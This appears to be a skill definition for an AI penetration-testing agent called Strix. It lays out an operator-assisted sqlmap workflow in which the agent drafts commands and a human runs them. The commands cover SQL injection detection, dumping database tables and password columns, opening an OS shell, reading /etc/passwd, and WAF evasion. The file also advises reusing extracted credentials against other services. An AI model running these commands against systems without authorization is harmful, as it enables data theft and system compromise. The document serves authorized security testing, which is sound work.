---
name: sqlmap
description: Operator-assisted SQLMap workflows for automated SQL injection detection, exploitation, database enumeration, and data extraction
category: tools
tags: [exploitation, sql-injection, database, operator-assisted]
---

# SQLMap

Automated SQL injection detection and exploitation tool. Supports all major DBMS types, injection techniques, and advanced evasion. Use when Strix identifies potential SQL injection points that need deep automated testing.

## When to Request

- After identifying a potential SQLi point that needs confirmation and exploitation
- When manual testing suggests injection but payloads need automated optimization
- For database enumeration and data extraction after confirming injection
- When WAF evasion techniques are needed for confirmed SQLi

## Operator-Assisted Workflow

1. Agent identifies injection candidate (parameter, header, cookie) from proxy analysis
2. Agent provides SQLMap command with the exact request details (URL, method, parameters, cookies)
3. Operator runs SQLMap and provides output
4. Agent analyzes results: injection type, DBMS, extracted data
5. Agent directs further extraction or uses DB access to chain attacks

## Key Commands

### Basic Detection
```
sqlmap -u "https://TARGET/page?id=1" --batch --output-dir=./sqlmap_output
```

### From Saved Request File
```
# Save request from Burp/proxy as request.txt
sqlmap -r request.txt --batch --output-dir=./sqlmap_output
```

### Specify Injection Point
```
sqlmap -u "https://TARGET/api/users" --data='{"id":"1*","name":"test"}' --method=POST -p id --batch
```

### Database Enumeration
```
# List databases
sqlmap -u "URL" --dbs --batch

# List tables
sqlmap -u "URL" -D database_name --tables --batch

# Dump table
sqlmap -u "URL" -D database_name -T table_name --dump --batch

# Dump specific columns
sqlmap -u "URL" -D database_name -T users -C username,password --dump --batch
```

### Advanced Techniques
```
# All injection techniques
sqlmap -u "URL" --technique=BEUSTQ --batch

# Time-based only (stealthier)
sqlmap -u "URL" --technique=T --time-sec=5 --batch

# OS shell (if stacked queries supported)
sqlmap -u "URL" --os-shell --batch

# File read
sqlmap -u "URL" --file-read="/etc/passwd" --batch

# Privilege check
sqlmap -u "URL" --is-dba --batch
```

### WAF Evasion
```
sqlmap -u "URL" --tamper=space2comment,between,randomcase --random-agent --delay=1 --batch
```

### Cookie/Header Injection
```
sqlmap -u "https://TARGET/page" --cookie="session=abc; id=1*" --level=3 --risk=3 --batch
sqlmap -u "https://TARGET/page" -H "X-Custom: 1*" --level=5 --risk=3 --batch
```

## Output Analysis

- **Injection confirmed** -- note technique (boolean, time, union, stacked), DBMS, and injectable parameter
- **DBA privileges** -- if true, OS command execution and file read/write may be possible
- **Database contents** -- credentials, PII, tokens; test for credential reuse
- **WAF detected** -- suggest tamper scripts; agent can help craft evasion strategies
- **No injection found** -- try increasing `--level` and `--risk`, or test different parameters

## Integration with Strix

- Agent identifies SQLi candidates from proxy testing and provides exact request format
- Extracted credentials feed into authentication testing against all services
- Database schema knowledge informs business logic and IDOR testing
- Confirmed SQLi with impact is documented via Strix reporting tools
